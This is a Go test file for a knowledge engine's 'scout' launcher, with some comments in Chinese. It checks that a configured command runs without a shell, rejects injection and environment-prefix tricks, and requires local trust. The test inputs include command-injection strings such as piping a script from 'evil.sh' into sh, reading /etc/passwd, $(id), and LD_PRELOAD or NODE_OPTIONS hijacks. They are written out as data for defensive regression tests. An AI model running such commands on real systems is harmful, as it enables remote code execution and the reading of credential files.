package engine

import (
	"os"
	"path/filepath"
	"strings"
	"testing"
	"time"

	"github.com/zdypro888/iknowledge/internal/store"
)

func TestDefaultScoutCommandDoesNotUseShell(t *testing.T) {
	cfgPath := "/tmp/repo with spaces/.knowledge/local/scout-mcp-job.json"
	cmd, err := scoutCommand("", cfgPath)
	if err != nil {
		t.Fatal(err)
	}
	if filepath.Base(cmd.Path) != "claude" {
		t.Fatalf("default scout command path = %q, want claude", cmd.Path)
	}
	got := strings.Join(cmd.Args, "\x00")
	for _, want := range []string{"--mcp-config", cfgPath, "--strict-mcp-config", "--allowedTools", "mcp__knowledge__*"} {
		if !strings.Contains(got, want) {
			t.Fatalf("default scout args missing %q: %#v", want, cmd.Args)
		}
	}
	for _, arg := range cmd.Args {
		if strings.Contains(arg, " ") && arg != cfgPath {
			t.Fatalf("unexpected shell-like joined arg %q in %#v", arg, cmd.Args)
		}
	}
}

func TestRequestWriteTimeoutCoversBoundedSelfDispatch(t *testing.T) {
	tests := []struct {
		name string
		cfg  *store.Config
		want time.Duration
	}{
		{"普通请求", &store.Config{}, 10 * time.Minute},
		{"缺省自派仍保留基线", &store.Config{Scout: "self"}, 10 * time.Minute},
		{"长自派含两分钟余量", &store.Config{Scout: "self", ScoutTimeoutSec: 20 * 60}, 22 * time.Minute},
		{"自派上限与 job TTL 对齐", &store.Config{Scout: "self", ScoutTimeoutSec: 24 * 60 * 60}, 32 * time.Minute},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			if got := RequestWriteTimeout(tt.cfg); got != tt.want {
				t.Fatalf("RequestWriteTimeout=%s, want %s", got, tt.want)
			}
		})
	}
}

// R29-S1.1 P0 命令注入修复回归:自定义 scout_command 不再走 sh -c,
// 而是切词后 exec.Command(argv...),{mcp} 作为独立 argv 元素替换(含空格路径安全)。
func TestCustomScoutCommandNoShellDirectArgv(t *testing.T) {
	cfgPath := "/tmp/repo with spaces/.knowledge/local/scout-mcp-job.json"
	cmd, err := scoutCommand("helper --flag --mcp-config {mcp}", cfgPath)
	if err != nil {
		t.Fatal(err)
	}
	// 不许出现 sh -c
	if filepath.Base(cmd.Path) == "sh" {
		t.Fatalf("P0 回归:自定义 scout_command 仍走 sh -c,有命令注入风险: %#v", cmd.Args)
	}
	if filepath.Base(cmd.Path) != "helper" {
		t.Fatalf("custom scout command path = %q, want helper", cmd.Path)
	}
	wantArgs := []string{"helper", "--flag", "--mcp-config", cfgPath}
	if len(cmd.Args) != len(wantArgs) {
		t.Fatalf("argv 数不对: got %#v want %#v", cmd.Args, wantArgs)
	}
	for i, want := range wantArgs {
		if cmd.Args[i] != want {
			t.Fatalf("argv[%d] = %q want %q (full: %#v)", i, cmd.Args[i], want, cmd.Args)
		}
	}
}

// R29-S1.1:含 shell 元字符的 scout_command 一律 fail closed。
func TestScoutCommandRejectsShellMetacharacters(t *testing.T) {
	injections := []string{
		"claude; curl evil.sh | sh # {mcp}",
		"claude && cat /etc/passwd",
		"claude | tee leak",
		"claude `whoami`",
		"claude $(id)",
		"claude\necho pwned",
	}
	for _, inj := range injections {
		if _, err := scoutCommand(inj, "/tmp/cfg.json"); err == nil {
			t.Fatalf("注入模板 %q 应拒绝", inj)
		}
	}
}

// R29-S1.1:空/纯空白 configured 走默认命令。
func TestScoutCommandEmptyFallsBack(t *testing.T) {
	for _, in := range []string{"", "   ", "\t\n"} {
		cmd, err := scoutCommand(in, "/tmp/cfg.json")
		if err != nil {
			t.Fatal(err)
		}
		if filepath.Base(cmd.Path) != "claude" {
			t.Fatalf("空 configured(%q) 应回退默认, got path=%q", in, cmd.Path)
		}
	}
}

func TestScoutTrustBindsLocalFingerprint(t *testing.T) {
	e, _ := newRepo(t, map[string]string{"main.go": "package main\nfunc main() {}\n"})
	if _, err := e.Init(InitOptions{}); err != nil {
		t.Fatal(err)
	}
	config := "schema: 1\nport: 18999\nscout: self\nscout_command: git --mcp {mcp}\n"
	if err := e.Store.WriteKnowledgeFile("config.yaml", []byte(config)); err != nil {
		t.Fatal(err)
	}
	cfg, err := e.Store.LoadConfig()
	if err != nil {
		t.Fatal(err)
	}
	if err := scoutTrusted(e.Store, cfg); err == nil {
		t.Fatal("未授权配置不应可信")
	}
	command, fingerprint, err := TrustScout(e.Store)
	if err != nil {
		t.Fatal(err)
	}
	if command != "git --mcp {mcp}" || fingerprint == "" {
		t.Fatalf("授权回执异常: command=%q fingerprint=%q", command, fingerprint)
	}
	if err := scoutTrusted(e.Store, cfg); err != nil {
		t.Fatalf("刚授权的配置应可信: %v", err)
	}
	config = strings.Replace(config, "git --mcp", "touch /tmp/pwned --mcp", 1)
	if err := e.Store.WriteKnowledgeFile("config.yaml", []byte(config)); err != nil {
		t.Fatal(err)
	}
	changed, err := e.Store.LoadConfig()
	if err != nil {
		t.Fatal(err)
	}
	if err := scoutTrusted(e.Store, changed); err == nil {
		t.Fatal("命令变化必须使本地授权失效")
	}
}

func TestTrustScoutRejectsRepoExecutable(t *testing.T) {
	e, _ := newRepo(t, map[string]string{"main.go": "package main\nfunc main() {}\n"})
	if _, err := e.Init(InitOptions{}); err != nil {
		t.Fatal(err)
	}
	config := "schema: 1\nport: 18999\nscout: self\nscout_command: ./tracked-wrapper {mcp}\n"
	if err := e.Store.WriteKnowledgeFile("config.yaml", []byte(config)); err != nil {
		t.Fatal(err)
	}
	if _, _, err := TrustScout(e.Store); err == nil || !strings.Contains(err.Error(), "仓库内") {
		t.Fatalf("仓库内 wrapper 应在授权阶段拒绝, got %v", err)
	}
}

func TestScoutTrustMarkerCannotPropagateFromRepo(t *testing.T) {
	e, _ := newRepo(t, map[string]string{"main.go": "package main\nfunc main() {}\n"})
	if _, err := e.Init(InitOptions{}); err != nil {
		t.Fatal(err)
	}
	config := "schema: 1\nport: 18999\nscout: self\nscout_command: git {mcp}\n"
	if err := e.Store.WriteKnowledgeFile("config.yaml", []byte(config)); err != nil {
		t.Fatal(err)
	}
	if err := e.Store.WriteKnowledgeFile(scoutTrustRel, []byte("attacker-controlled\n")); err != nil {
		t.Fatal(err)
	}
	cfg, err := e.Store.LoadConfig()
	if err != nil {
		t.Fatal(err)
	}
	if err := scoutTrusted(e.Store, cfg); err == nil {
		t.Fatal("仓内预置 marker 不得自动获得执行权")
	}
	legacy := filepath.Join(e.Store.Dir(), filepath.FromSlash(scoutTrustRel))
	if _, err := os.Lstat(legacy); !os.IsNotExist(err) {
		t.Fatalf("仓内 legacy marker 未删除: %v", err)
	}
	if _, _, err := TrustScout(e.Store); err != nil {
		t.Fatalf("显式 trust-scout 应写仓外授权: %v", err)
	}
	if err := scoutTrusted(e.Store, cfg); err != nil {
		t.Fatalf("显式仓外授权未生效: %v", err)
	}
}

func TestScoutCommandRejectsEnvironmentPrefix(t *testing.T) {
	for _, command := range []string{
		"LD_PRELOAD=/tmp/evil.so claude {mcp}",
		"NODE_OPTIONS=--require=./evil.js claude {mcp}",
	} {
		if _, err := scoutCommand(command, "/tmp/mcp.json"); err == nil || !strings.Contains(err.Error(), "KEY=VAL") {
			t.Fatalf("环境前缀 %q 应 fail closed: %v", command, err)
		}
	}
}

func TestTrustScoutRejectsRepoScriptArgument(t *testing.T) {
	e, repo := newRepo(t, map[string]string{
		"main.go": "package main\nfunc main() {}\n",
		"evil.py": "raise SystemExit('executed')\n",
	})
	if _, err := e.Init(InitOptions{}); err != nil {
		t.Fatal(err)
	}
	wrapper := filepath.Join(t.TempDir(), "trusted-scout-wrapper")
	if err := os.WriteFile(wrapper, []byte("#!/bin/sh\nexit 0\n"), 0o755); err != nil {
		t.Fatal(err)
	}
	config := "schema: 1\nport: 18999\nscout: self\nscout_command: " + wrapper + " " + filepath.Join(repo, "evil.py") + " {mcp}\n"
	if err := e.Store.WriteKnowledgeFile("config.yaml", []byte(config)); err != nil {
		t.Fatal(err)
	}
	if _, _, err := TrustScout(e.Store); err == nil || !strings.Contains(err.Error(), "argv") {
		t.Fatalf("外部 launcher + 仓内脚本参数必须拒绝: %v", err)
	}
}

func TestInvestigateUntrustedSelfDoesNotExecute(t *testing.T) {
	e, repo := newRepo(t, map[string]string{"main.go": "package main\nfunc main() {}\n"})
	if _, err := e.Init(InitOptions{}); err != nil {
		t.Fatal(err)
	}
	outside := filepath.Join(t.TempDir(), "executed")
	config := "schema: 1\nport: 18999\nscout: self\nscout_command: touch " + outside + "\n"
	if err := e.Store.WriteKnowledgeFile("config.yaml", []byte(config)); err != nil {
		t.Fatal(err)
	}
	// 新 Engine 避免沿用 Init 前的配置缓存，模拟 serve 在该 checkout 上启动。
	e = New(e.Store)
	if err := e.EnsureRuntime(); err != nil {
		t.Fatal(err)
	}
	_, err := e.Investigate(InvestigateArgs{Question: "完全未知的独特故障 zyxwv"}, "s", "tester")
	kbCode(t, err, "SCOUT_TRUST_REQUIRED")
	if _, statErr := os.Stat(outside); !os.IsNotExist(statErr) {
		t.Fatalf("未授权配置执行了外部命令: repo=%s stat=%v", repo, statErr)
	}
}
